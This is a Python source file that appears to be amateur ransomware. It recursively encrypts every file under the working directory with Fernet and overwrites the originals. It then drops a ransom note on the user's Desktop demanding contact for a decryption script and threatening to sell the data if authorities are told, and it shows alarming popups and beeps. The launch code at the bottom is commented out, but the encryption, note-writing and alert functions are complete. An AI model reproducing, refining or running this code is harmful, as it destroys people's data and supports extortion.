

import os,sys,subprocess
from pathlib import Path
import winsound
import threading
from tkinter import * 
from tkinter import messagebox 

try:
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    subprocess.check_call([sys.executable , "-m" , "pip install" , "cryptography"])
    from cryptography.fernet import Fernet

def make_noise(n):
  #duration = n  # milliseconds
  s = int(n)
  freq = 550  # Hz
  for i in range(s):
      winsound.Beep(freq, 1000)
      winsound.Beep(freq+150, 1000)

def main_enc(key):
    cwd1 = os.getcwd()
    files = []
    global excep_count
    excep_count = 0
    def writefilenames():
        global excep_count
        try:
            for file in os.listdir():
                if file=='BadLuck.py' or file=='GoodLuck.py' or file=='$RECYCLE.BIN':
                    continue
                elif os.path.isfile(file):
                    temp = os.getcwd()
                    files.append(os.path.join(temp,file))
                elif os.path.isdir(file):
                    temp = os.getcwd()
                    os.chdir(os.path.join(temp,file))
                    writefilenames()
                    os.chdir(temp)
        except : 
            excep_count += 1
    writefilenames()
    print(files)
    

    #key = Fernet.generate_key()
    # key=b'37P6Ce5p1GkCELGoEWRDBgRd_GYf7iwoV2FFG1PuEug='
    try:
        for file in files:
            with open(file,'rb') as curfile:
                data = curfile.read()
                curfile.close()
            enc_data = Fernet(key).encrypt(data)+b'\n\n~~SamaelWasHere<^^>'
            with open(file,'wb') as f:
                f.write(enc_data)
                f.close()
    except:
        excep_count += 1
    print(excep_count)
def readme(aname):
    cwd = os.getcwd()
    usrname = subprocess.run('whoami',capture_output=True,text=True)
    usrname = usrname.stdout[:-1]
    uname = usrname.split(sep='\\')[1] 
    path = f"C:\\Users\\{uname}\\Desktop\\"
    os.chdir(path)
    with open("README.md",'a') as f:
        f.truncate(00)
        f.write(f'Greetings Dear Customer {uname},\n\tI am {aname}, the person who has messed up you files and data on your external drive or the internal drive \n(hope you have partioned your drives). I am a good person and prevented the partion of C drive but if you are \nas dumb as a rock and dont have other partion then congrats!\n\nI dont have intrest in your data mey it be sensitive or just games... But if you want your data back in safe and \nsolid manner then kindly contact me and gain the decrypting script.\n\nIf you want to contact the authorities then forget your data i might as well then steal your data and sell it for \nsome spare coins on the darknet.\n\nHope you dont test my patience and contact me soon.\n\nYours truly,\n\t{aname}\n\t(A kind-hearted but short tempered cybersec expert)\n\n\n\n###SWasHere <^^>/###')
        f.close()
    
def msgbox():   
    text = "###ALL THE FILES HAVE BEEN ENCRYPTED AND READ 'README.md' FILE FOR FURTHER INFORMATION ON HOW TO RECOVER THE FILES.\nBy yours truly ~~Samael <^^>/###"
    messagebox.showerror("Ransomeware Executed Successfully", text)
     

def repeatbox(n):
    n = int(n)
    root = Tk() 
    root.geometry("300x100") 
      
    w = Label(root, text ='\n\n~~SWasHere<^^>', font = "50")  
    w.pack()
    root.mainloop()  
    c=0
    while c<n:
        msgbox()
        c+=1
        

#Main thread start:
# key=b'37P6Ce5p1GkCELGoEWRDBgRd_GYf7iwoV2FFG1PuEug='
# aname = "samael"
# t1 = threading.Thread(target=make_noise,args=('3'))
# t2 = threading.Thread(target=main_enc,args=(key))
# t4 = threading.Thread(target=readme,args=(aname))
# t3 = threading.Thread(target=repeatbox,args=('3'))
# t2.start()
# t2.join()
# t1.start()
# t4.start()
# t4.join()
# t3.start()

